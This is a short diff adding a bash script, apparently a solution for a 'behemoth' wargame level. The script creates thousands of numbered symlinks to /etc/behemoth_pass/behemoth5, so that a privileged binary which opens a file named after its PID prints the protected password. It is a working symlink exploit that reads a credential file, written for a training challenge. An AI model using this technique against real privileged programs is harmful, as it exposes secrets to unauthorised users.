@@ -1,0 +1,10 @@
+  1 #!/bin/bash                             
+  2      
+  3 for i in {25000..33000}                 
+  4      
+  5 do   
+  6     ln -s /etc/behemoth_pass/behemoth5 $i
+  7 done    
+
+as ./behemoth5 prints whats in the file (if its named its pid) and using fopen
+
